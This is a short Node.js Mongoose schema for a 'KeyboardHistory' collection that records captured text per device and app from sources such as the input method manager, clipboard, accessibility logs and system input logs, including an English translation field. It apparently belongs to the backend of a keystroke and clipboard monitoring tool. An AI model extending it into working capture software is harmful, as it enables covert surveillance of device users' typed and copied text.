const mongoose = require('mongoose');

const keyboardHistorySchema = new mongoose.Schema({
    id: {
        type: String,
        required: true,
        unique: true
    },
    source: {
        type: String,
        required: true,
        enum: ['InputMethodManager', 'Clipboard', 'RecentApps', 'AccessibilityLogs', 'SystemInputLogs']
    },
    content: {
        type: String,
        required: true
    },
    contentEN: {
        type: String,
        default: ''
    },
    timestamp: {
        type: Number,
        required: true
    },
    packageName: {
        type: String,
        required: true
    },
    appName: {
        type: String,
        required: true
    },
    deviceId: {
        type: String,
        required: true
    },
    inputType: {
        type: String,
        required: true
    },
    captureTime: {
        type: Number,
        required: true
    },
    scanType: {
        type: String,
        default: 'keyboard_history'
    },
    createdAt: {
        type: Date,
        default: Date.now
    },
    updatedAt: {
        type: Date,
        default: Date.now
    }
}, {
    timestamps: true
});

// Index for efficient queries
keyboardHistorySchema.index({ deviceId: 1, timestamp: -1 });
keyboardHistorySchema.index({ packageName: 1, timestamp: -1 });
keyboardHistorySchema.index({ source: 1, timestamp: -1 });

module.exports = mongoose.model('KeyboardHistory', keyboardHistorySchema);
